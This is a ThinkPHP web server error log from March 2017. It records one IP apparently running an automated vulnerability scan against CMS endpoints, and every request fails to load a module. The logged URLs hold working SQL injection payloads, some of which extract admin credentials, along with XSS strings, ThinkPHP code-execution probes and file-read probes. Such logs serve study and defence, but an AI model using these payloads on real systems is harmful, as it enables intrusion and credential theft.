[ 2017-03-21T15:44:12+08:00 ] 123.125.160.217 /?s=abc~abc~abc~$%7B@print(md5(base64_decode(MzYwd2Vic2Nhbg)))%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000330s ]
ERR: 无法加载模块:Abc~abc~abc~${@print(md5(base64_decode(MzYwd2Vic2Nhbg)))}

[ 2017-03-21T15:44:14+08:00 ] 123.125.160.217 /?s=/abc/abc/abc/$%7B@print(md5(base64_decode(MzYwd2Vic2Nhbg)))%7D/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000304s ]
ERR: 无法加载模块:Abc

[ 2017-03-21T15:44:40+08:00 ] 123.125.160.217 /index.php/api/xmlrpc
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000307s ]
ERR: 无法加载模块:Api

[ 2017-03-21T15:44:44+08:00 ] 123.125.160.217 /index.php?m=search&a=public_get_suggest_keyword&url=http://www.baidu.com/&q=/../robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000515s ]
ERR: 无法加载模块:Search

[ 2017-03-21T15:44:48+08:00 ] 123.125.160.217 /index.php?a=list_type&c=index&m=link&siteid=1'%20and%20(select%201%20from%20(select%20count(*),concat(md5(1122),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a);%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000361s ]
ERR: 无法加载模块:Link

[ 2017-03-21T15:45:07+08:00 ] 123.125.160.217 /index.php?m=poster&c=index&a=poster_click&id=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
INFO: [ app_init ] --END-- [ RunTime:0.000591s ]
ERR: 无法加载模块:Poster

[ 2017-03-21T15:46:20+08:00 ] 123.125.160.217 /index.php?act=ajax&do=datacall&in_ajax=1&m=index&op=get_datacall
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000310s ]
ERR: 无法加载模块:Index

[ 2017-03-21T15:46:21+08:00 ] 123.125.160.217 /index.php/product/list?keyword=kn1f3'+union+select+1,2,3,4,5,(select+concat(0x7c,admin_name,0x7c,admin_pw,0x7c,sha1(0x3336307765627363616e))+from+pe_admin),7,8,9,10,11,12,13,14,15,16,17,18,19%20and+'1'='1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000368s ]
ERR: 无法加载模块:Product

[ 2017-03-21T15:46:43+08:00 ] 123.125.160.217 /index.php?m=announcement&s=admin/notice
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000000s ]
INFO: [ app_init ] --END-- [ RunTime:0.000560s ]
ERR: 无法加载模块:Admin

[ 2017-03-21T15:47:01+08:00 ] 123.125.160.217 /index.php?m=video&c=video_for_ck&a=add_f_ckeditor&vid=1&title=a%E9%8C%A6%27,0,0,0,0,0,%28select%20%281%29%20from%20mysql.user%20where%201=1%20aNd%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20%28version%28%29%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%29%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000353s ]
ERR: 无法加载模块:Video

[ 2017-03-21T15:47:08+08:00 ] 123.125.160.217 /index.php?m=company&s=space_comments&uid=1%20and%20extractvalue(1,%20concat(0x5c,%20(select%20md5(1122)%20from%20information_schema.tables%20limit%201)));%20--
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000380s ]
ERR: 无法加载模块:Space_comments

[ 2017-03-21T15:47:09+08:00 ] 123.125.160.217 /index.php?m=Order&a=index
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000377s ]
ERR: 无法加载模块:Order

[ 2017-03-21T15:47:21+08:00 ] 123.125.160.217 /index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000300s ]
ERR: 无法加载模块:Cms

[ 2017-03-21T15:47:59+08:00 ] 123.125.160.217 /?m=vote&id=&vid=1,3)%20and%20%20webscan1122%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000321s ]
ERR: 无法加载模块:Vote

[ 2017-03-21T15:48:02+08:00 ] 123.125.160.217 /index.php?m=message&s=inquiry_basket
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000341s ]
ERR: 无法加载模块:Inquiry_basket

[ 2017-03-21T15:48:03+08:00 ] 123.125.160.217 /index.php?m=message&s=inquire&userid=1)%20UnIon%20select%201,12,123%20from%20webscan%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
INFO: [ app_init ] --END-- [ RunTime:0.000516s ]
ERR: 无法加载模块:Inquire

[ 2017-03-21T15:48:04+08:00 ] 123.125.160.217 /index.php?m=announcement&s=admin/notice_manager&action=modify&id=1212%20UnIon%20select%201,2,concat(user,0x7c,password),4,5,6,7,8%20from%20webscan%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
ERR: 无法加载模块:Admin

[ 2017-03-21T15:48:05+08:00 ] 123.125.160.217 /index.php?m=company&s=space_mail&tid=1)%20and%201=websec%20%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000289s ]
ERR: 无法加载模块:Space_mail

[ 2017-03-21T15:48:06+08:00 ] 123.125.160.217 /index.php?m=company&s=admin/exportexcel&ordrby=user%20and%201=websec%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000294s ]
ERR: 无法加载模块:Admin

[ 2017-03-21T15:48:07+08:00 ] 123.125.160.217 /index.php?m=news&s=admin/news&newsid=1%20and%20(SELECT%201%20from%20websec)
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: [ app_init ] --END-- [ RunTime:0.000450s ]
ERR: 无法加载模块:Admin

[ 2017-03-21T15:48:21+08:00 ] 123.125.160.217 /index.php?c=com_index&m=yp&userid=12%22%3E%3Ciframe%20src=javascript:alert(42873)%3E
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000318s ]
ERR: 无法加载模块:Yp

[ 2017-03-21T15:48:22+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%22%20onmouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000367s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:23+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%22%20onmouseover=alert(42873)%20y=&rent_mode=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:24+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%22%20onmouseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000383s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:25+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=4_100%22%20onmouseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000279s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:26+08:00 ] 123.125.160.217 /index.php?a=lists&agent=2%22%20onmouseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: [ app_init ] --END-- [ RunTime:0.000296s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:27+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%22%20onmouseover=alert(42873)%20y=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:28+08:00 ] 123.125.160.217 /index.php?m=yp&c=index&a=lists&areaid=37%20%20onmouseover%3Dprompt%2842873%29%20&catid=10&price=1_500&page=1&order=4
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000308s ]
ERR: 无法加载模块:Yp

[ 2017-03-21T15:48:29+08:00 ] 123.125.160.217 /index.php?m=yp&c=index&a=lists&areaid=37&catid=10&price=%22%20onmouseover=prompt(42873)%20&page=1&order=4
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
INFO: [ app_init ] --END-- [ RunTime:0.000495s ]
ERR: 无法加载模块:Yp

[ 2017-03-21T15:48:30+08:00 ] 123.125.160.217 /index.php?m=yp&c=index&a=lists&areaid=12&catid=114&price=&tid=1%22%20onmouseover=prompt(42873)%20&page=1&order=1
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000336s ]
ERR: 无法加载模块:Yp

[ 2017-03-21T15:48:31+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%20onmonmouseoverouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000286s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:32+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=2000_3000%20onmonmouseoverouseover=alert(42873)%20y=&rent_mode=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000359s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:33+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%20onmouonmouseoverseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000310s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:34+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=4_100%20onmouonmouseoverseover=alert(42873)%20y=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=336
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000319s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:35+08:00 ] 123.125.160.217 /index.php?a=lists&agent=2%20onmoonmouseoveruseover=alert(42873)%20y=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:36+08:00 ] 123.125.160.217 /index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=&price=&rent_mode=2%20onmoonmouseoveruseover=alert(42873)%20y=&zone=3363
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000312s ]
ERR: 无法加载模块:Content

[ 2017-03-21T15:48:47+08:00 ] 123.125.160.217 /index.php?m=wap&siteid=1&a=big_image&url=aHR0cDovL3hzc3Rlc3QuY29tIiBvbmVycm9yPSJqYXZhc2NyaXB0OmFsZXJ0KDQyODczKTs=
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000329s ]
ERR: 无法加载模块:Wap

[ 2017-03-21T15:48:54+08:00 ] 123.125.160.217 /index.php/list-10%20UNION/**/all/**/SELECT/**/listid,listid1,modelid,siteid,norder,ncount,ncountall,(select%20concat(0x23,md5(1122),0x23)%20from%20kc_admin%20where%20adminid=1),klistname,kkeywords,kdescription,kimage,isblank,iscontent,kcontent,klistpath,ktemplatelist1,ktemplatelist2,nlistnumber,kpathmode,ktemplatepage1,ktemplatepage2,npagenumber,ispublish1,ispublish2,norder1,norder3,norder4,norder5,nupdatelist,nupdatepage,isexist,nlist,npage,gid,ismenu1,ismenu2,ismenu3,ismenu4,ismenu5,ismap,klanguage,gidpublish%20from%20king_list%20where%20listid=4%23.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000503s ]
ERR: 无法加载模块:List-10%20UNION

[ 2017-03-21T15:48:55+08:00 ] 123.125.160.217 /index.php?m=video&c=video_for_ck&a=add_f_ckeditor&vid=1&title=1122&description=a%E9%8C%A6%27,0,0,0,0,0,%28select%20%281%29%20from%20mysql.user%20where%201=1%20aNd%20%28SELECT%201%20FROM%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28Select%20%28version%28%29%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%29%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000324s ]
ERR: 无法加载模块:Video

[ 2017-03-21T15:49:14+08:00 ] 123.125.160.217 /index.php?m=company&s=admin/business_info_list
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000475s ]
ERR: 无法加载模块:Admin

[ 2017-03-21T15:49:17+08:00 ] 123.125.160.217 /?m=offer&s=offer_list&id=1-webscan%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
ERR: 无法加载模块:Offer_list

[ 2017-03-21T15:49:47+08:00 ] 123.125.160.217 /?m=info.detail&id=1-webscan
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000288s ]
ERR: 无法加载模块:Info.detail

[ 2017-03-21T15:49:49+08:00 ] 123.125.160.217 /?m=city.getSearch&index=reer
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000023s ]
INFO: [ app_init ] --END-- [ RunTime:0.000539s ]
ERR: 无法加载模块:City.getSearch

[ 2017-03-21T15:49:50+08:00 ] 123.125.160.217 /?m=info&rewrite=1'%20union%20select%201,concat(0x23,md5(1122),0x23)%20from%20my_admin%20where%20id=1%20--%20a
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000333s ]
ERR: 无法加载模块:Info

[ 2017-03-21T15:49:52+08:00 ] 123.125.160.217 /index.php?act=ajax&do=datacall&in_ajax=1&m=index&op=get_datacall
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000310s ]
ERR: 无法加载模块:Index

[ 2017-03-21T15:50:31+08:00 ] 123.125.160.217 /index.php/Index/index/name/$%7B@print(md5(1122))%7D
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000323s ]
ERR: 无法加载模块:Index

[ 2017-03-21T15:50:32+08:00 ] 123.125.160.217 /index.php?m=news&s=admin/newslist&submit=%E5%88%A0%E9%99%A4&did=999%29%20and%20%28SELECT%201%20from%20%28select%20count%28*%29,concat%28floor%28rand%280%29*2%29,%28substring%28%28select%28selEct%20concat%28user,0x7c,password%29%20from%20f10bd198561acb0197452013b7a82429%20limit%200,1%29%29,1,62%29%29%29a%20from%20information_schema.tables%20group%20by%20a%29b%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000412s ]
ERR: 无法加载模块:Admin

[ 2017-03-21T15:50:33+08:00 ] 123.125.160.217 /index.php?m=payment&s=admin/pickupmod
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000299s ]
ERR: 无法加载模块:Admin

[ 2017-03-21T15:50:56+08:00 ] 123.125.160.217 /index.php?m=api&a=userpreview
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000285s ]
ERR: 无法加载模块:Api

[ 2017-03-21T15:50:57+08:00 ] 123.125.160.217 /index.php?m=Appmanager&a=loadapp
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000327s ]
ERR: 无法加载模块:Appmanager

[ 2017-03-21T15:51:29+08:00 ] 123.125.160.217 /index.php?m=Goods&a=showcate&id=1'cfreer
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000300s ]
ERR: 无法加载模块:Goods

[ 2017-03-21T15:58:49+08:00 ] 123.125.160.217 /index.php/*123*/'union/**/select/**/1,2,3,4,5,6,7,8,md5(1122),10,11%23&action=getatlbyid
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000359s ]
ERR: 无法加载模块:*123*

[ 2017-03-21T16:00:12+08:00 ] 123.125.160.217 /index.php?act=ajax&do=datacall&in_ajax=1&m=index&op=get_datacall
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
INFO: [ app_init ] --END-- [ RunTime:0.000687s ]
ERR: 无法加载模块:Index

[ 2017-03-21T16:05:12+08:00 ] 123.125.160.217 /index.php?act=ajax&do=datacall&in_ajax=1&m=index&op=get_datacall
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
ERR: 无法加载模块:Index

[ 2017-03-21T16:05:32+08:00 ] 123.125.160.217 /index.php?m=register&c=ajax_reg
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000337s ]
ERR: 无法加载模块:Register

[ 2017-03-21T16:05:38+08:00 ] 123.125.160.217 /index.php?m=register&c=ajax_reg
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000311s ]
ERR: 无法加载模块:Register

[ 2017-03-21T16:05:50+08:00 ] 123.125.160.217 /index.php?c=api&m=data&auth=finecms&param=action%3Dcache%20name%3DSPACE-MODEL.1%27%5D%3Bprint%28md5%281122%29%29%3B%2f%2f
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000301s ]
ERR: 无法加载模块:Data

[ 2017-03-21T16:09:07+08:00 ] 123.125.160.217 /?m=product&s=list&key=12'%20and%201=(updatexml(1,concat(0x5e24,(select%20md5(1122)),0x5e24),1))%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000453s ]
ERR: 无法加载模块:List

[ 2017-03-21T16:13:07+08:00 ] 123.125.160.217 /index.php/Site/page/id/-7266)%20UNION%20ALL%20SELECT%200x63656461723A66696E643A696969696969,NULL,NULL,NULL%23.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000852s ]
ERR: 无法加载模块:Site

[ 2017-03-21T16:13:08+08:00 ] 123.125.160.217 /index.php/Site/listTpl/id/-7266)%20UNION%20ALL%20SELECT%200x63656461723A66696E643A696969696969,NULL,NULL,NULL%23.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
INFO: [ app_init ] --END-- [ RunTime:0.000323s ]
ERR: 无法加载模块:Site

[ 2017-03-21T16:13:09+08:00 ] 123.125.160.217 /index.php/Site/article/id/-5724)%20UNION%20ALL%20SELECT%2011,11,11,0x63656461723A66696E643A696969696969,11,11,11,11,11,11,11,11,11%23.html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000061s ]
INFO: [ app_init ] --END-- [ RunTime:0.000567s ]
ERR: 无法加载模块:Site

[ 2017-03-21T16:14:35+08:00 ] 123.125.160.217 /?m=User&a=login_800&from=tuan800&sign=xxoo&qname=%27%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x7765627363616e%29%2CFLOOR%28RAND%280%29%2a2%29%29X%20FROM%20information_schema.tables%20GROUP%20BY%20X%29a%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000312s ]
ERR: 无法加载模块:User

[ 2017-03-21T16:14:36+08:00 ] 123.125.160.217 /index.php?m=Ajax&a=gettypeattr&type_id=1%27%20AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x7765627363616e%29%2CFLOOR%28RAND%280%29%2a2%29%29X%20FROM%20information_schema.tables%20GROUP%20BY%20X%29a%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000304s ]
ERR: 无法加载模块:Ajax

[ 2017-03-21T16:14:48+08:00 ] 123.125.160.217 /index.php?m=Goods&a=showByUname&uname=%2527AND%20%28SELECT%201%20FROM%28SELECT%20COUNT%28%2a%29%2CCONCAT%28md5%280x7765627363616e%29%2CFLOOR%28RAND%280%29%2a2%29%29X%20FROM%20information_schema.tables%20GROUP%20BY%20X%29a%29%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000383s ]
ERR: 无法加载模块:Goods

[ 2017-03-21T16:15:03+08:00 ] 123.125.160.217 /index.php/abc-abc-abc-$%7B@exit(md5(118741911))%7D/
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
INFO: [ app_init ] --END-- [ RunTime:0.000392s ]
ERR: 无法加载模块:Abc-abc-abc-${@exit(md5(118741911))}

[ 2017-03-21T16:15:41+08:00 ] 123.125.160.217 /index.php/?Itemid=11&option=com_search&searchword=%f6%22%20onmouseover%3dprompt(3312)%20//&task=search
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
ERR: 无法加载模块:Index

[ 2017-03-21T16:16:49+08:00 ] 123.125.160.217 /index.php?m=member&c=index&a=public_checkname_ajax&username=admin%25%252727%20and%201=1%23
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000322s ]
ERR: 无法加载模块:Member

[ 2017-03-21T16:17:18+08:00 ] 123.125.160.217 /index.php?s=/down/down/&file=./index.php
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
INFO: [ app_init ] --END-- [ RunTime:0.000289s ]
ERR: 无法加载模块:Down

[ 2017-03-21T16:17:23+08:00 ] 123.125.160.217 /index.php/weblinks-categories?id=just_test
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
INFO: [ app_init ] --END-- [ RunTime:0.000319s ]
ERR: 无法加载模块:Weblinks-categories

[ 2017-03-21T16:17:24+08:00 ] 123.125.160.217 /index.php/admin/?case=archive&act=respond&code=alipay&trade_status=WAIT_SELLER_SEND_GOODS
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
INFO: [ app_init ] --END-- [ RunTime:0.000313s ]
ERR: 无法加载模块:Admin

[ 2017-03-21T16:17:25+08:00 ] 123.125.160.217 /index.php?m=Article&a=showByUname&uname=%2527or%25201%253D%2528select%25201%2520from%2520%2528select%2520count%2528%252a%2529%252Cconcat%2528floor%2528rand%25280%2529%252a2%2529%252C%2528select%2520md5%25281122%2529%2520from%2520fanwe_admin%2520limit%25200%252C1%2529%2529a%2520from%2520information_schema.tables%2520group%2520by%2520a%2529b%2529%2523
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000055s ]
INFO: [ app_init ] --END-- [ RunTime:0.000873s ]
ERR: 无法加载模块:Article

